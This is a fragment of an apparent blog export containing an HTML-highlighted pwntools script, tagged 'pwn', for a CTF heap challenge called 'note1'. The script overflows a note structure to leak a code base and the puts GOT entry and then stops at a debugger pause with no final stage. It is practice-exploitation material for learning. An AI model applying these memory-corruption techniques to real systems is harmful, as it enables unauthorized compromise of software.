data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">.</span>log_level <span class=\"token operator\">=</span> <span class=\"token string\">'debug'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">#p=remote('node4.buuoj.cn',25727)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>p<span class=\"token operator\">=</span>process<span class=\"token punctuation\">(</span><span class=\"token string\">\"./note1\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>libc<span class=\"token operator\">=</span>ELF<span class=\"token punctuation\">(</span><span class=\"token string\">\"./libc.so.6\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>e<span class=\"token operator\">=</span>ELF<span class=\"token punctuation\">(</span><span class=\"token string\">\"./note1\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\">#write_plt=e.plt[\"write\"]</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\">#read_plt=e.plt[\"read\"]</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">new</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">,</span>name_length<span class=\"token punctuation\">,</span>name<span class=\"token punctuation\">,</span>tag<span class=\"token punctuation\">,</span>fun<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"> \"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"1\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"id: \"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"name_length: \"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>name_length<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"name: \"</span><span class=\"token punctuation\">,</span>name<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"tag: \"</span><span class=\"token punctuation\">,</span>tag<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"func: \"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>fun<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">edit_name</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">,</span>name_length<span class=\"token punctuation\">,</span>name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"> \"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"2\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"id: \"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"> \"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"1\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"name_length: \"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>name_length<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"name: \"</span><span class=\"token punctuation\">,</span>name<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">edit_tag</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">,</span>tag<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"> \"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"2\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"id: \"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"> \"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"2\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"new tag: \"</span><span class=\"token punctuation\">,</span>tag<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">edit_func</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">,</span>func<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"> \"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"2\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"id: \"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"> \"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"3\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"func: \"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>func<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"41\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">call</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"> \"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"3\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"id: \"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre></pre></td></tr><tr><td data-num=\"45\"></td><td><pre></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>new<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x500</span><span class=\"token punctuation\">,</span><span class=\"token string\">b\"a\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">b\"b\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>edit_tag<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token string\">b\"a\"</span><span class=\"token operator\">*</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>edit_func<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>call<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre></pre></td></tr><tr><td data-num=\"51\"></td><td><pre><span class=\"token comment\">#p.recvuntil(\"tag: \\n\")</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"aaaaaaaa\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>text_base<span class=\"token operator\">=</span>u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-</span><span class=\"token number\">0x131B</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>log<span class=\"token punctuation\">.</span>info<span class=\"token punctuation\">(</span><span class=\"token string\">\"text:\"</span><span class=\"token operator\">+</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>text_base<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre><span class=\"token comment\">#gdb.attach(p)</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre><span class=\"token comment\">#pause()</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>puts_plt<span class=\"token operator\">=</span>text_base<span class=\"token operator\">+</span>e<span class=\"token punctuation\">.</span>plt<span class=\"token punctuation\">[</span><span class=\"token string\">\"puts\"</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>puts_got<span class=\"token operator\">=</span>text_base<span class=\"token operator\">+</span>e<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">\"puts\"</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>edit_name<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x20</span><span class=\"token punctuation\">,</span><span class=\"token string\">b\"a\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>new<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x20</span><span class=\"token punctuation\">,</span><span class=\"token string\">b\"a\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">b\"b\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>payload1<span class=\"token operator\">=</span><span class=\"token string\">b\"a\"</span><span class=\"token operator\">*</span><span class=\"token number\">0x20</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x31</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">b\"c\"</span><span class=\"token operator\">*</span><span class=\"token number\">8</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>text_base<span class=\"token operator\">+</span><span class=\"token number\">0x131B</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>puts_got<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>edit_name<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x20</span><span class=\"token punctuation\">,</span>payload1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>call<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"name: \"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>puts_got<span class=\"token operator\">=</span>u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>log<span class=\"token punctuation\">.</span>info<span class=\"token punctuation\">(</span><span class=\"token string\">\"text:\"</span><span class=\"token operator\">+</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>puts_got<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>new<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">64</span><span class=\"token punctuation\">,</span><span class=\"token string\">b\"a\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">b\"b\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre></pre></td></tr><tr><td data-num=\"75\"></td><td><pre></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure>",
            "tags": [
                "pwn"
            ]
        }
    ]
}